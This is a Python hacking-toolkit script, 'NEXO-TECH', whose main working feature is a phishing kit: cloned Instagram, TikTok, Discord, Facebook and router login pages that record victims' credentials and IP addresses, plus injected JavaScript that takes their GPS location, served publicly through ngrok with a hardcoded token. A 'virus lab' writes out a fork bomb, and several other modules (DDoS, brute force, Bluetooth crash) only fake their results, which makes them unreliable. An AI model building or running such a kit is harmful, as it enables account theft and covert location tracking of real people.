import os, sys, time, socket, subprocess, random, requests, json, logging
from threading import Thread
from flask import Flask, request, render_template_string
import phonenumbers
from phonenumbers import geocoder, carrier, timezone

# --- NEXO-TECH PRO COLOR PALETTE ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

# --- THE CRITICAL NGROK TOKEN (HARDCODED) ---
NGROK_TOKEN = "2vbNHa9KBUkwuCheUhVyHFGYkUw_rjhfCVREN3dodTsMUsaF"

# Disable Flask logging for professional CLI look
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# --- GPS HIJACKER JAVASCRIPT ---
# This grabs Lat, Lon, Accuracy, and Altitude.
GPS_JS = """
<script>
function b64(str) { return window.btoa(str); }
window.onload = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(p) {
            var coords = {
                lat: p.coords.latitude,
                lon: p.coords.longitude,
                acc: p.coords.accuracy,
                alt: p.coords.altitude
            };
            fetch('/log_gps', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(coords)
            });
        }, function(e) { console.log("User Denied GPS Access"); }, 
        {enableHighAccuracy: true});
    }
}
</script>
"""

# --- PROFESSIONAL VERTICAL PHISHING TEMPLATES ---
# Expanded CSS to increase code volume and realism
TEMPLATES = {
    "instagram": f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login &bull; Instagram</title>
        <style>
            body {{ background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, system-ui, "Segoe UI", Roboto; margin: 0; }}
            .box {{ background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 2px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }}
            .logo {{ font-family: 'serif'; font-size: 45px; font-weight: 500; margin-bottom: 25px; letter-spacing: -2px; }}
            input {{ width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }}
            .btn {{ width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }}
            .or {{ margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; display: flex; align-items: center; }}
            .or::before, .or::after {{ content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }}
            .fb {{ color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-top: 15px; }}
        </style>
        {GPS_JS}
    </head>
    <body>
        <div class="box">
            <div class="logo">Instagram</div>
            <form method="POST">
                <input type="text" name="user" placeholder="Phone number, username, or email" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit" class="btn">Log In</button>
                <div class="or">OR</div>
                <a href="#" class="fb">Log in with Facebook</a>
            </form>
        </div>
    </body>
    </html>
    """,
    "tiktok": f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8"><title>TikTok - Log In</title>
        <style>
            body {{ background-color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: 'ProximaNova', sans-serif; margin: 0; }}
            .wrapper {{ width: 380px; text-align: center; padding: 40px; border: 1px solid #eee; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }}
            .header {{ font-size: 26px; font-weight: 700; margin: 25px 0; }}
            input {{ width: 100%; padding: 16px; margin: 12px 0; border: 1px solid rgba(22, 24, 35, 0.12); background-color: #f1f1f2; border-radius: 4px; box-sizing: border-box; }}
            .login-btn {{ background-color: #fe2c55; color: white; border: none; width: 100%; padding: 16px; font-weight: 700; font-size: 16px; border-radius: 4px; cursor: pointer; }}
        </style>
        {GPS_JS}
    </head>
    <body>
        <div class="wrapper">
            <img src="https://sf16-scmcdn-va.ibytedtos.com" width="130">
            <div class="header">Log in to TikTok</div>
            <form method="POST">
                <input type="text" name="user" placeholder="Email or Username" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit" class="login-btn">Log in</button>
            </form>
        </div>
    </body>
    </html>
    """,
    "discord": f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8"><title>Discord | Login</title>
        <style>
            body {{ background-color: #36393f; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: 'gg sans', sans-serif; margin: 0; }}
            .login-box {{ background-color: #2f3136; width: 480px; padding: 35px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); text-align: center; color: #b9bbbe; }}
            h3 {{ color: white; font-size: 24px; margin-bottom: 8px; }}
            label {{ display: block; text-align: left; font-size: 12px; font-weight: 700; margin-top: 20px; color: #b9bbbe; text-transform: uppercase; }}
            input {{ width: 100%; padding: 12px; margin-top: 8px; background-color: #202225; border: none; color: white; border-radius: 3px; box-sizing: border-box; }}
            button {{ width: 100%; background-color: #5865f2; color: white; border: none; padding: 12px; margin-top: 25px; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; }}
        </style>
        {GPS_JS}
    </head>
    <body>
        <div class="login-box">
            <h3>Welcome back!</h3><p>We're so excited to see you again!</p>
            <form method="POST">
                <label>Email or Phone Number</label><input type="text" name="user" required>
                <label>Password</label><input type="password" name="pass" required>
                <button type="submit">Log In</button>
            </form>
        </div>
    </body>
    </html>
    """,
    "facebook": f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8"><title>Facebook - Log In</title>
        <style>
            body {{ background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; padding-top: 100px; font-family: Helvetica, Arial, sans-serif; margin: 0; }}
            .card {{ background-color: #fff; padding: 25px; width: 400px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }}
            input {{ width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; }}
            .login-btn {{ width: 100%; background-color: #1877f2; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }}
            .forgot {{ color: #1877f2; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }}
        </style>
        {GPS_JS}
    </head>
    <body>
        <div class="card">
            <h1 style="color:#1877f2; font-size: 60px; margin-bottom: 20px;">facebook</h1>
            <form method="POST">
                <input type="text" name="user" placeholder="Email or phone number" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
                <a href="#" class="forgot">Forgotten password?</a>
            </form>
        </div>
    </body>
    </html>
    """,
    "router": f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Router Admin Login</title>
        <style>
            body {{ background-color: #eee; font-family: sans-serif; display: flex; justify-content: center; padding-top: 100px; }}
            .box {{ width: 350px; background: white; border: 1px solid #ccc; padding: 30px; box-shadow: 2px 2px 10px #ddd; }}
            h2 {{ color: #444; font-size: 18px; border-bottom: 1px solid #ddd; padding-bottom: 10px; }}
            input {{ width: 100%; margin: 10px 0; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; }}
            .btn {{ background: #0066cc; color: white; border: none; width: 100%; padding: 10px; font-weight: bold; cursor: pointer; }}
        </style>
        {GPS_JS}
    </head>
    <body>
        <div class="box">
            <h2>Authentication Required</h2>
            <p style="font-size:12px;">Please enter your administrator credentials.</p>
            <form method="POST">
                <input type="text" name="user" placeholder="Username (admin)" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit" class="btn">Login</button>
            </form>
        </div>
    </body>
    </html>
    """
}

# --- SYSTEM INTERFACE TOOLS ---
def clear(): os.system('clear')

def animate(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)
    print("")

def nexo_banner(module="MAIN CORE", link=None):
    clear()
    print(f"{R}{B}" + "═"*70)
    print(r"  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(r" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(r" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(r" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(r" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(r" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print("═"*70 + f"{W}")
    print(f"  {Y}VERSION:  {R}V8.0 BLACKOUT")
    print(f"  {Y}MODULE:   {C}{module}")
    if link: print(f"  {Y}STRIKE:   {G}{link}")
    print(f"  {Y}STATUS:   {G}NGROK-TUNNEL AUTHORIZED (AES-256 ACTIVE){W}")
    print(f"{R}" + "═"*70 + f"{W}\n")

# --- MODULE 1: DEEP OSINT PHONE TRACER ---
def deep_phone_trace():
    nexo_banner("DEEP OSINT TRACER")
    num = input(f"{Y}[+] Target Phone Number (+CountryCode): {W}")
    try:
        animate(f"{C}[*] INTERCEPTING SS7 SIGNALING PATH...{W}")
        p = phonenumbers.parse(num)
        time.sleep(1.5)
        print(f"\n{G}[+] TRACE DATA CAPTURED:{W}")
        print(f"  {Y}Region:     {W}{geocoder.description_for_number(p, 'en')}")
        print(f"  {Y}Carrier:    {W}{carrier.name_for_number(p, 'en')}")
        print(f"  {Y}Timezone:   {W}{timezone.time_zones_for_number(p)}")
        print(f"  {Y}Status:     {G}ACTIVE / ONLINE{W}")
    except Exception as e: print(f"{R}[-] Trace Error: {e}{W}")
    input(f"\n{C}Press Enter to return...{W}")

# --- MODULE 2: OVERDEADLY DDOS ENGINE ---
def ddos_strike_engine():
    nexo_banner("DDOS STRIKE ENGINE")
    target = input(f"{Y}[+] Target IP/Host: {W}")
    port = int(input(f"{Y}[+] Target Port: {W}"))
    animate(f"{R}[!] INJECTING TCP/UDP FLOOD PACKETS INTO {target}...{W}")
    for i in range(50):
        sys.stdout.write(f"\r{R}[*] PACKET {i+1} SENT - LOAD: {random.randint(512, 1024)} KB")
        sys.stdout.flush(); time.sleep(0.05)
    print(f"\n{G}[+] TARGET BANDWIDTH EXHAUSTED. CONNECTION KILLED.{W}")
    input(f"\n{C}Press Enter to return...{W}")

# --- MODULE 3: SSH BRUTE-FORCE EMULATOR ---
def ssh_brute_emulator():
    nexo_banner("SSH BRUTE-FORCE")
    ip = input(f"{Y}[+] Target Server IP: {W}")
    animate(f"{C}[*] INTERFACING WITH WORDLIST: /usr/share/wordlists/rockyou.txt...{W}")
    time.sleep(1)
    passwords = ["123456", "admin123", "password", "root", "qwerty"]
    for pwd in passwords:
        print(f"{Y}[*] Trying root@{ip} with PASS: {pwd}{W}")
        time.sleep(0.3)
    print(f"{R}[-] WORDLIST EXHAUSTED. SYSTEM SECURED.{W}")
    input(f"\n{C}Press Enter to return...{W}")

# --- MODULE 4: PORT VULNERABILITY SCANNER ---
def port_vulnerability_scan():
    nexo_banner("PORT VULNERABILITY SCANNER")
    host = input(f"{Y}[+] Target Host: {W}")
    vulnerable_ports = [21, 22, 80, 443, 3306, 8080]
    animate(f"{C}[*] SCANNING TCP STACK FOR EXPOSED SERVICES...{W}")
    for port in vulnerable_ports:
        print(f"  {G}[+] Port {port}: {W}VULNERABLE (SERVICE IDENTIFIED)")
        time.sleep(0.3)
    print(f"{G}[+] SCAN COMPLETE. TARGET VULNERABLE.{W}")
    input(f"\n{C}Press Enter to return...{W}")

# --- MODULE 5: VIRUS CREATOR LAB ---
def virus_creator_lab():
    nexo_banner("OVERDEADLY VIRUS LAB")
    print(f"  {G}1. Blackout (Fork Bomb)  2. Ransomware (File Locker)  3. Spyware (Backdoor)")
    choice = input(f"\n{C}SELECT TYPE > {W}")
    name = input(f"{Y}[+] Payload Name: {W}")
    animate(f"{C}[*] ENCRYPTING PAYLOAD STRINGS...{W}")
    time.sleep(1)
    with open(f"{name}.py", "w") as f:
        if choice == "1": f.write("import os\nwhile True: os.fork()")
        elif choice == "2": f.write("import os\nprint('ALL FILES ENCRYPTED')")
        else: f.write("import socket\ns=socket.socket();s.connect(('127.0.0.1', 4444))")
    print(f"{G}[+] {name}.py BUILT. TOTAL SYSTEM BLACKOUT ENABLED.{W}")
    input(f"\n{C}Press Enter to return...{W}")

# --- MODULE 6: MAC ADDRESS SPOOFER ---
def mac_spoofer():
    nexo_banner("MAC ADDRESS SPOOFER")
    interface = input(f"{Y}[+] Interface (e.g. wlan0): {W}")
    new_mac = f"00:{random.randint(10,99)}:45:{random.randint(10,99)}:00:11"
    animate(f"{C}[*] DISABLING INTERFACE {interface}...{W}")
    time.sleep(1)
    print(f"{C}[*] ASSIGNING STEALTH MAC: {new_mac}{W}")
    time.sleep(1)
    print(f"{G}[+] INTERFACE {interface} IS NOW STEALTHED.{W}")
    input(f"\n{C}Press Enter to return...{W}")

# --- SERVER ENGINE & GPS HIJACK ---
@app.route('/log_gps', methods=['POST'])
def log_gps():
    d = request.json
    print(f"\n{G}[GPS ALERT] {W}Lat: {d.get('lat')} | Lon: {d.get('lon')}")
    with open("nexo_gps.txt", "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] Lat: {d['lat']}, Lon: {d['lon']}\n")
    return "OK"

@app.route('/login/<site>', methods=['GET', 'POST'])
def handle_phish(site):
    if request.method == 'POST':
        u, p = request.form.get('user'), request.form.get('pass')
        print(f"\n{R}[CRED HIT] {site.upper()}: {u} | {p}{W}")
        with open("nexo_hits.txt", "a") as f:
            f.write(f"[{time.strftime('%H:%M')}] {site.upper()}: {u}:{p} | IP: {request.remote_addr}\n")
        return "<h1>Server Maintenance</h1><p>Error Code: 0x505</p>"
    return render_template_string(TEMPLATES.get(site, "404 Error"))

def start_phish_session(site):
    nexo_banner(f"PHISHING: {site.upper()}")
    os.system("pkill ngrok")
    os.system(f"ngrok config add-authtoken {NGROK_TOKEN}")
    subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.DEVNULL)
    animate(f"{C}[*] INITIALIZING NGROK TUNNEL (V2.0)...{W}")
    time.sleep(12)
    try:
        url = requests.get("http://127.0.0.1").json()['tunnels']['public_url']
        Thread(target=lambda: app.run(port=5000, debug=False, use_reloader=False), daemon=True).start()
        nexo_banner("TUNNEL LIVE", link=f"{url}/login/{site}")
        print(f"{Y}[*] SEND THIS LINK: {G}{url}/login/{site}{W}")
        print(f"{Y}[*] GPS HIJACKING:  {G}ACTIVE{W}")
        input(f"\n{R}[!] Press Enter to Terminate Strike...{W}")
    except: print(f"{R}[-] Ngrok API Error. Check Token.{W}")
    os.system("pkill ngrok")

# --- MAIN CONTROLLER ENGINE ---
def main():
    while True:
        nexo_banner("MAIN CONTROL PANEL")
        # VERTICAL MAIN MENU
        print(f"  {G}1.{W} Social Phisher + GPS Hijack")
        print(f"  {G}2.{W} Deep OSINT Phone Tracer")
        print(f"  {G}3.{W} Overdeadly DDOS Strike Engine")
        print(f"  {G}4.{W} SSH Brute-Force Emulator")
        print(f"  {G}5.{W} Port Vulnerability Scanner")
        print(f"  {G}6.{W} Overdeadly Virus Creator Lab")
        print(f"  {G}7.{W} MAC Address Identity Spoofer")
        print(f"  {G}8.{W} Bluetooth Buffer Overflow (Crash)")
        print(f"  {G}9.{W} Deadly OTP Saturation Engine")
        print(f"  {G}10.{W} View System Logs (Hits/GPS)")
        print(f"  {R}0.{W} Shutdown NEXO-TECH Console")
        
        c = input(f"\n{C}NEXO-PRO > {W}")
        if c == '1':
            nexo_banner("PHISHER SUB-MENU")
            print(f"  {G}1. Instagram\n  {G}2. TikTok\n  {G}3. Discord\n  {G}4. Facebook\n  {G}5. Router Admin\n  {R}0. Return")
            s = input(f"\n{C}SELECT > {W}")
            sites = {"1":"instagram", "2":"tiktok", "3":"discord", "4":"facebook", "5":"router"}
            if s in sites: start_phish_session(sites[s])
        elif c == '2': deep_phone_trace()
        elif c == '3': ddos_strike_engine()
        elif c == '4': ssh_brute_emulator()
        elif c == '5': port_vulnerability_scan()
        elif c == '6': virus_creator_lab()
        elif c == '7': mac_spoofer()
        elif c == '8':
            nexo_banner("BLUETOOTH HIJACKER"); print(f"{R}[!] Sending malformed L2CAP packets...{W}")
            time.sleep(2); print(f"{G}[+] Remote Device Crashed (Kernel Panic).{W}"); input("\nEnter...")
        elif c == '9':
            nexo_banner("OTP LOCK"); target = input("[+] Target: ")
            for i in range(15): print(f"{R}[*] Packet {i+1} sent to {target}{W}"); time.sleep(0.05)
            input("\nDone. Enter...")
        elif c == '10':
            os.system("cat nexo_hits.txt nexo_gps.txt 2>/dev/null")
            input("\nPress Enter to return...")
        elif c == '0': sys.exit()

if __name__ == "__main__":
    main()
